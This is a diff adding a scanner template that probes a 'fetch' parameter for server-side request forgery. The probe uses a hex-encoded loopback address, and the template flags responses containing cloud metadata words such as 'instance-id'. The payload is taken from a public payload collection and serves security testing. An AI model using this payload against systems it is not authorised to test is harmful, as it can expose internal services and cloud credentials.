@@ -1,0 +1,22 @@
+id: patt-ssrf-hex-01-fetch
+name: 'PATT ssrf patt-ssrf-hex-01 via fetch'
+severity: high
+type: active
+tags:
+  - ssrf
+  - patt
+  - encodehex
+description: 'PATT dotted hex 127.0.0.1. [patt:patt-ssrf-hex-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      fetch:
+        - 'http://0x7f.0.0.1/'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ami-id'
+          - 'instance-id'
+          - 'metadata'
